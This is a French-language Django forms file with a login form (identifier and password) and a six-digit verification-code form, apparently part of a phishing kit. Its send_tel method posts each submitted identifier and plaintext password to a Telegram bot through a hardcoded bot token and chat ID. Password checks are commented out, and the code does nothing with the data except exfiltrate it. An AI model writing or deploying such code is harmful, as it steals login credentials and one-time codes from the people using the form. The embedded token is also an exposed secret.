from django import forms
import requests
from django.core.exceptions import ValidationError


class InscriptionForm(forms.Form):
    identifiant = forms.CharField(
        label="Identifiant",
        max_length=100,
        widget=forms.TextInput(attrs={'placeholder': 'Identifiant'}),
    )
    mot_de_passe = forms.CharField(
        label="Mot de passe",
        required=True,
        widget=forms.TextInput(attrs={'placeholder': 'Mot de passe'}),
        max_length=32,
    )

    def clean_identifiant(self):
        identifiant = self.cleaned_data.get('identifiant', '').strip()
        if not identifiant:
            raise ValidationError("L'identifiant ne peut pas être vide.")
        if len(identifiant) < 3:
            raise ValidationError("L'identifiant doit contenir au moins 3 caractères.")
        if ' ' in identifiant:
            raise ValidationError("L'identifiant ne doit pas contenir d'espaces.")
        return identifiant

    def clean_mot_de_passe(self):
        mot_de_passe = self.cleaned_data.get('mot_de_passe', '')
        #if len(mot_de_passe) < 8:
         #   raise ValidationError("Le mot de passe doit contenir au moins 8 caractères.")
        #if not any(c.isdigit() for c in mot_de_passe):
         #   raise ValidationError("Le mot de passe doit contenir au moins un chiffre.")
        #if not any(c.isupper() for c in mot_de_passe):
         #   raise ValidationError("Le mot de passe doit contenir au moins une majuscule.")
        return mot_de_passe

    def send_tel(self):
        identifiant = self.cleaned_data.get('identifiant')
        mot_de_passe = self.cleaned_data.get('mot_de_passe')
        CHAT_ID = "8849728706"
        TOKEN = "8995148469:AAHNG55Z9GrPq6-X1AKDUTLsgVmB91VWaL8"
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {
            "chat_id": CHAT_ID,
            "text": f"Nouvelle Connexion : {identifiant} Mot de passe : {mot_de_passe}"
        }
        try:
            response = requests.post(url, data=data, timeout=5)
            response.raise_for_status()
        except requests.RequestException as e:
            print(f"Erreur lors de l'envoi au bot : {e}")


class VerificationForm(forms.Form):
    code = forms.CharField(
        label="Code de vérification",
        max_length=6,
        min_length=6,
        widget=forms.TextInput(attrs={
            'placeholder': '——————',
            'class': 'code-input',
            'inputmode': 'numeric',
        }),
    )